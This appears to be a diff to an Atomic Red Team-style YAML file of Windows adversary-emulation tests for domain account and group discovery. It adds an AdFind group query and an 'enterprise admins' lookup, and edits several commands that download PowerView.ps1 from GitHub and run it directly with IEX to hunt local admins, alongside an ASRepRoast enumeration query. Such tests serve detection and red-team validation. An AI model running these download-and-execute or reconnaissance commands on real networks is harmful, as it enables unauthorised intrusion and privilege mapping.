@@ -13,6 +13,7 @@ atomic_tests:
       net localgroup
       net group /domain
       net group "domain admins" /domain
+      net group "enterprise admins" /domain
     name: command_prompt
 - name: Permission Groups Discovery PowerShell (Domain)
   auto_generated_guid: 6d5d8c96-3d2a-4da9-9d6d-9a9d341899a7
@@ -52,7 +53,7 @@ atomic_tests:
   - windows
   executor:
     command: |
-      IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1'); Find-LocalAdminAccess -Verbose
+      IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-LocalAdminAccess -Verbose
     name: powershell
 - name: Find local admins on all machines in domain (PowerView)
   auto_generated_guid: a5f0d9f8-d3c9-46c0-8378-846ddd6b1cbd
@@ -62,7 +63,7 @@ atomic_tests:
   - windows
   executor:
     command: |
-      IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1'); Invoke-EnumerateLocalAdmin  -Verbose
+      IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-EnumerateLocalAdmin  -Verbose
     name: powershell
 - name: Find Local Admins via Group Policy (PowerView)
   auto_generated_guid: 64fdb43b-5259-467a-b000-1b02c00e510a
@@ -76,7 +77,7 @@ atomic_tests:
       type: Path
       default: $env:COMPUTERNAME
   executor:
-    command: "IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1'); Find-GPOComputerAdmin -ComputerName #{computer_name} -Verbose"
+    command: "IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-GPOComputerAdmin -ComputerName #{computer_name} -Verbose"
     name: powershell
 - name: Enumerate Users Not Requiring Pre Auth (ASRepRoast)
   auto_generated_guid: 870ba71e-6858-4f6d-895c-bb6237f6121b
@@ -103,3 +104,28 @@ atomic_tests:
     elevation_required: false
     command: |
       get-aduser -f * -pr DoesNotRequirePreAuth | where {$_.DoesNotRequirePreAuth -eq $TRUE}
+- name: Adfind - Query Active Directory Groups
+  auto_generated_guid: 48ddc687-82af-40b7-8472-ff1e742e8274
+  description: | 
+    Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Groups
+    reference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html
+  supported_platforms:
+  - windows
+  input_arguments:
+    adfind_path:
+      description: Path to the AdFind executable
+      type: Path
+      default: PathToAtomicsFolder\T1087.002\src\AdFind.exe
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      AdFind.exe must exist on disk at specified location (#{adfind_path})
+    prereq_command: |
+      if (Test-Path #{adfind_path}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      Invoke-WebRequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/src/AdFind.exe" -OutFile #{adfind_path}
+  executor:
+    command: |
+      #{adfind_path} -f (objectcategory=group)
+    name: command_prompt
+
